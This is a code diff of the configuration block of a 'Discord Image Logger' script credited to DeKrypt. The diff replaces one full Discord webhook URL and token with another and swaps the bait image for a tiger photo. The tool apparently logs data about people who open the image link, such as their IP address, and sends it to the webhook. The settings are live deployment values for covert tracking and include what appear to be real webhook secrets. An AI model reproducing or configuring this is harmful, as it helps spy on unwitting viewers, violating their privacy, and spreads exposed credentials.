@@ -1,4 +1,3 @@
-
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
@@ -13,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1349511250391859251/dAcP6yNxbr4KPxmTN6sodWODrGG30iAkH01mRMNA-Jb0R1jluTL9_rG847YWVSI1vWsR",
-    "image": "https://i.imgflip.com/6byx1t.png?a483528", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1359628281539985701/9hsRTk5aGUkKgy8_6_kBm8iS7Mz4zA7WEnu8bIwscntMRJyqsWaeddbcsFMyLPovuqC0",
+    "image": "https://static.vecteezy.com/system/resources/thumbnails/036/324/708/small/ai-generated-picture-of-a-tiger-walking-in-the-forest-photo.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
